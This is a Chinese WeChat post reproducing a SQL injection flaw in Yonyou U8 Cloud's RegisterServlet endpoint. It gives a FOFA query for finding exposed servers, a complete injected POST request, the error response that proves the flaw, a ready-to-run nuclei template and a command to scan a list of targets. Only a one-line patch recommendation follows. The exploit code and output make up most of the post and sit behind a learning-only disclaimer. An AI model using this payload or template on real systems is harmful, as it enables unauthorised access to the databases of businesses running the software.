#  用友u8-cloud RegisterServlet SQL注入漏洞复现 nuclei poc

原创 fgz  [ AI与网安 ](javascript:void\(0\);)

**AI与网安** ![]()

微信号 gh_c57275954216

功能介绍 漏洞复现 0day/nday分享 poc/exp分享 渗透工具分享 AI算法在网络安全中的应用

____

___发表于_

收录于合集

  

免责申明： **本
文内容为学习笔记分享，仅供技术学习参考，请勿用作违法用途，任何个人和组织利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责，与作者无关！！！**

 **  
**

  

01

—

漏洞名称

  

  

用友u8cloud RegisterServlet SQL注入漏洞

  

02

—  

漏洞影响

  

用友U8 cloud

  

![]()

  

  

03

—  

漏洞描述

  

U8
cloud是用友推出的企业上云数字化平台，主要聚焦成长型、创新型企业，提供企业级云ERP整体解决方案，全面支持多组织业务协同、营销创新、智能财务、人力服务，构建产业链制造平台，融合用友云服务，实现企业互联网资源连接、共享、协同，赋能中国成长型企业高速发展、云化创新。该产品RegisterServlet接口处存在SQL注入漏洞，攻击者可通过该漏洞获取数据库权限。

  

04

—  

FOFA搜索语句  

  * 

    
    
    title="u8c"

![]()

  

05

—  

漏洞复现

  

向靶场发送数据包，计算123456的MD5值

  *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    POST /servlet/RegisterServlet HTTP/1.1Host: 192.168.86.128:8089User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36Connection: closeContent-Length: 85Accept: */*Accept-Language: enContent-Type: application/x-www-form-urlencodedX-Forwarded-For: 127.0.0.1Accept-Encoding: gzip  
    usercode=1' and substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32)>0--

响应数据包如下

  *   *   *   *   *   *   *   * 

    
    
    HTTP/1.1 200 OKConnection: closeContent-Length: 71Date: Mon, 13 Nov 2023 02:25:54 GMTServer: Apache-Coyote/1.1Set-Cookie: JSESSIONID=F66A9268A74114BADA7CB11346378B11.server; Path=/; HttpOnly  
    Error:?? nvarchar ? 'e10adc3949ba59abbe56e057f20f883e' ??????? int ????

![]()

证明存在漏洞

  

06

—  

nuclei poc

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    id: yonyou-u8-cloud-RegisterServlet-sqli  
    info:  name: 用友 u8-cloud RegisterServlet SQL注入漏洞  author: fgz  severity: high  description: 'U8 cloud是用友推出的企业上云数字化平台，主要聚焦成长型、创新型企业，提供企业级云ERP整体解决方案，全面支持多组织业务协同、营销创新、智能财务、人力服务，构建产业链制造平台，融合用友云服务，实现企业互联网资源连接、共享、协同，赋能中国成长型企业高速发展、云化创新。该产品存在SQL注入漏洞，攻击者可通过该漏洞获取数据库权限。'  tags: 2023,u8-cloud,sqli,yonyou  metadata:    max-request: 3    fofa-query: title="u8c"    verified: true  
    http:  - method: POST    path:      - "{{BaseURL}}/servlet/RegisterServlet"    headers:      Content-Type: application/x-www-form-urlencoded      X-Forwarded-For: 127.0.0.1    body: "usercode=1' and substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32)>0--"    matchers:      - type: word        words:          - "e10adc3949ba59abbe56e057f20f883e"        condition: and

运行POC  

  * 

    
    
    nuclei.exe -l u8cloud.txt -t yonyou-u8-cloud-RegisterServlet-sqli.yaml

![]()

  

07

—  

修复建议

  

打上官方补丁或者升级到最新版本。

  

预览时标签不可点

微信扫一扫  
关注该公众号

轻触阅读原文

继续滑动看下一个

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

